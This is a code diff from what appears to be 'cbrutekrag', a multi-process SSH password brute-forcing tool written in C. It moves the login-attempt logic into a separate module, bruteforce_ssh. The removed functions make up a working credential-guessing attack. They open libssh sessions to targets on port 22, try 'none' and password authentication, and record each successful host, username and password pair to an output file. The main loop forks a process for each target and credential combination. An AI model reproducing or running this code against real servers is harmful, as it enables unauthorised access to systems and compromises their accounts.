@@ -23,9 +23,10 @@ SOFTWARE.
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <libssh/libssh.h>
+#include <getopt.h>
 
 #include "cbrutekrag.h"
+#include "bruteforce_ssh.h"
 #include "log.h"
 #include "str.h"
 #include "wordlist.h"
@@ -53,103 +54,6 @@ void usage(const char *p)
 {
     printf("\nusage: %s [-h] [-v] [-T TARGETS.lst] [-C combinations.lst]\n"
             "\t\t[-t THREADS] [-o OUTPUT.txt] [TARGETS...]\n\n", p);
-}
-
-int try_login(const char *hostname, const char *username, const char *password)
-{
-    ssh_session my_ssh_session;
-    int verbosity = 0;
-    int port = 22;
-
-    if (g_verbose) {
-        verbosity = SSH_LOG_PROTOCOL;
-    } else {
-        verbosity = SSH_LOG_NOLOG;
-    }
-
-    my_ssh_session = ssh_new();
-
-    if (my_ssh_session == NULL) {
-        log_error("Cant create SSH session.");
-        return -1;
-    }
-
-    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, hostname);
-    ssh_options_set(my_ssh_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
-    ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &port);
-#if LIBSSH_VERSION_MAYOR > 0 || (LIBSSH_VERSION_MAYOR == 0 && LIBSSH_VERSION_MINOR >= 6)
-    ssh_options_set(my_ssh_session, SSH_OPTIONS_KEY_EXCHANGE, "none");
-    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOSTKEYS, "none");
-#endif
-    ssh_options_set(my_ssh_session, SSH_OPTIONS_TIMEOUT, &g_timeout);
-    ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, username);
-
-    int r;
-    r = ssh_connect(my_ssh_session);
-    if (r != SSH_OK) {
-        ssh_free(my_ssh_session);
-        if (g_verbose) {
-            log_error(
-                "Error connecting to %s: %s.",
-                hostname,
-                ssh_get_error(my_ssh_session)
-            );
-        }
-        return -1;
-    }
-
-    r = ssh_userauth_none(my_ssh_session, username);
-    if (r == SSH_AUTH_SUCCESS || r == SSH_AUTH_ERROR) {
-        ssh_disconnect(my_ssh_session);
-        ssh_free(my_ssh_session);
-        return r;
-    }
-
-    int method = 0;
-
-    method = ssh_userauth_list(my_ssh_session, NULL);
-
-    if (method & SSH_AUTH_METHOD_NONE) {
-        r = ssh_userauth_none(my_ssh_session, NULL);
-        if (r == SSH_AUTH_SUCCESS) {
-            ssh_disconnect(my_ssh_session);
-            ssh_free(my_ssh_session);
-            return r;
-        }
-    }
-
-    if (method & SSH_AUTH_METHOD_PASSWORD) {
-        r = ssh_userauth_password(my_ssh_session, NULL, password);
-        if (r == SSH_AUTH_SUCCESS) {
-            ssh_disconnect(my_ssh_session);
-            ssh_free(my_ssh_session);
-            return r;
-        }
-    }
-
-    ssh_disconnect(my_ssh_session);
-    ssh_free(my_ssh_session);
-    return -1;
-}
-
-int brute(char *hostname, char *username, char *password, int count, int total, FILE *output)
-{
-    if (! g_verbose) {
-        char bar_suffix[50];
-        sprintf(bar_suffix, "[%d] %s %s %s", count, hostname, username, password);
-        progressbar_render(count, total, bar_suffix, -1);
-    }
-    int ret = try_login(hostname, username, password);
-    if (ret == 0) {
-        log_debug("LOGIN OK!\t%s\t%s\t%s", hostname, username, password);
-        if (output != NULL) {
-            log_output(output, "LOGIN OK!\t%s\t%s\t%s", hostname, username, password);
-        }
-        return 0;
-    } else {
-        log_debug("LOGIN FAIL\t%s\t%s\t%s", hostname, username, password);
-    }
-    return -1;
 }
 
 int main(int argc, char** argv)
@@ -272,7 +176,8 @@ int main(int argc, char** argv)
             if (pid) {
                 p++;
             } else if(pid == 0) {
-                brute(hostnames.words[y], login_data[0], login_data[1], count, total, output);
+                bruteforce_ssh_try_login(hostnames.words[y], login_data[0],
+                    login_data[1], count, total, output);
                 exit(EXIT_SUCCESS);
             } else {
                 log_error("Fork failed!");
